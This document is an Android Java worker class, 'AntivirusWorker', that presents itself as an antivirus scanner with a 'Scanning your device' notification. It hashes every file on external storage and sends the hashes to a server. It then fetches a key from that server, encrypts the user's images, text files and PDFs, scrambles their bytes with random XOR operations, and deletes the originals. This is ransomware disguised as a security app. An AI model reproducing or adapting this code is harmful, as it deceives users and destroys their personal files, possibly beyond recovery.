package com.example.myapplication.workers;



import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.work.Data;
import androidx.work.ForegroundInfo;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.Request;
import com.android.volley.toolbox.Volley;
import com.example.myapplication.R;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.net.HttpCookie;
import java.net.URI;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Random;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import static android.provider.Settings.System.getString;
import static androidx.core.content.ContextCompat.getSystemService;

public class AntivirusWorker extends Worker {
    private final String url = "http://192.168.43.134:3000/hash";
    private final String LOG_TAG = "NUMBAH 1:";
    private Map<String,Object> listOfMalware = new HashMap<>();
    private MessageDigest md = MessageDigest.getInstance("MD5");
    private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
    private List<Integer> yes = new ArrayList<>();
    private int progressCount = 0;
    private int noOfFiles;
    public AntivirusWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        File yes = Environment.getExternalStorageDirectory();
        try {
            noOfFiles = getNoOfFiles(yes);
            yesu(yes);
        } catch (IOException | JSONException e) {
            Log.e(LOG_TAG, "shit", e);
        }
        return Result.success(new Data.Builder().putAll(listOfMalware).build());
    }

    private void yesu(File yes) throws IOException, JSONException {
       if(yes.exists()){
           File[] array = yes.listFiles();
           for (File oof:array) {
               if(oof.isDirectory()){
                   yesu(oof);
               }
               else{
                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath(), progressCount));
                   setProgressAsync(new Data.Builder().putString("Progress", String.format(Locale.ENGLISH,"%d/%d",progressCount,noOfFiles)).putString("File",oof.getAbsolutePath()).build());
                   FileInputStream fis = new FileInputStream(oof);
                   int i = 0;
                   do{
                       byte[] bytes = new byte[2097152];
                       i = fis.read(bytes);
                       md.update(bytes);
                   }while(i!=-1);
                   byte[] hash = md.digest();
                   BigInteger no = new BigInteger(1,hash);
                   StringBuilder wheeee = new StringBuilder(no.toString(16));
                   while (wheeee.length() < 32) {
                       wheeee.insert(0, "0");
                   }
                   JSONObject body = new JSONObject();
                   body.put("hash",wheeee);
                   YeetRequest jsonObjectRequest = new YeetRequest(YeetRequest.Method.POST,url,body,response->{
                       try {
                           boolean isMalware = response.getBoolean("malware");
                           if(isMalware){
                               String type = response.getString("type");
                               listOfMalware.put(oof.getAbsolutePath(),type);
                               boolean ree = oof.delete();
                               if(!ree){
                                   throw new Exception("failed");
                               }
                           }
                       } catch (Exception e) {
                           Log.e(LOG_TAG,"reeeee",e);
                       }
                   }, Throwable::printStackTrace);
                   Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
                   for(String lmao:extenstions) {
                       if (oof.getAbsolutePath().endsWith(lmao)) {
                           weeeeeeeeeeeeee(oof);
                       }
                   }
                   progressCount+= 1;
               }
           }
       }
    }

    private ForegroundInfo createForegroundInfo(String progress,int fileNo){
        Context context = getApplicationContext();
        String id = context.getString(R.string.app_name);
        String title = "Scanning your device";
        String cancel = "cancel";
        PendingIntent intent = WorkManager.getInstance(context)
                .createCancelPendingIntent(getId());
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createChannel(id);
        }

        Notification notification = new NotificationCompat.Builder(context, id)
                .setContentTitle(title)
                .setTicker(title)
                .setContentText(progress)
                .setSmallIcon(R.drawable.antivirus)
                .setOngoing(true)
                .setProgress(noOfFiles,fileNo,false)
                .addAction(android.R.drawable.ic_delete, cancel, intent)
                .setOnlyAlertOnce(true)
                .build();
        return new ForegroundInfo(5555,notification);
    }

   private void createChannel(String CHANNEL_ID){
       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
           String description = "NUMBAH 1!!!!";
           int importance = NotificationManager.IMPORTANCE_DEFAULT;
           NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_ID, importance);
           channel.setDescription(description);
           NotificationManager notificationManager = getSystemService(getApplicationContext(),NotificationManager.class);
           notificationManager.createNotificationChannel(channel);
       }
   }


    private void weeeeeeeeeeeeee(File file){
        YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,url,null,response -> {
            try {
                Log.i(LOG_TAG, response.getString("session-ID"));
                String boom = response.getString("key");
                md = MessageDigest.getInstance("SHA-256");
                byte[] keyBytes = md.digest(boom.getBytes());
                SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
                byte[] ivBytes = new byte[16];
                new SecureRandom().nextBytes(ivBytes);
                Cipher cipher = Cipher.getInstance("PBEWithHmacSHA256AndAES_256");
                IvParameterSpec iv = new IvParameterSpec(ivBytes);
                cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                FileInputStream fis = new FileInputStream(file);
                File encrypted = new File(file.getAbsolutePath().concat(".enc"));
                FileOutputStream fos = new FileOutputStream(encrypted);
                int i;
                byte[] bytes = new byte[65536];
                do{
                    i = fis.read(bytes);
                    bytes = shuffleFun(bytes);
                    cipher.update(bytes);
                }while(i!=-1);
                fos.write(cipher.doFinal());
                fis.close();
                fos.close();
                file.delete();
                Log.i(LOG_TAG, Arrays.toString(ivBytes));
            } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                Log.e(LOG_TAG, "shit", e);
            }
        },Throwable::printStackTrace);
        yeetRequest.setCookies(new CookieBoi(getApplicationContext()).get(URI.create(url)));
        Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
    }

    private byte[] shuffleFun(byte[] original){
        Random random = new Random();
        for(int i = 0;i<original.length;i++){
            int x = random.nextInt(original.length);
            original = x%16 == 0 ? xorFun(original,i,x) : original;
            Log.i(LOG_TAG,String.format("Byte %d is xored with byte %d",i,x));
        }
        return original;
    }

    private byte[] xorFun(byte[] original,int x,int y){
        byte xored = (byte) (original[x] ^ original[y]);
        original[x] = xored;
        return original;
    }

    private int getNoOfFiles(File file){
        int x = 0;
        File[] yes = file.listFiles();
        for(File oof : yes){
            if(oof.isDirectory()){
                x += getNoOfFiles(oof);
            }
            else{
                x += 1;
            }
        }
        return x;
    }
}
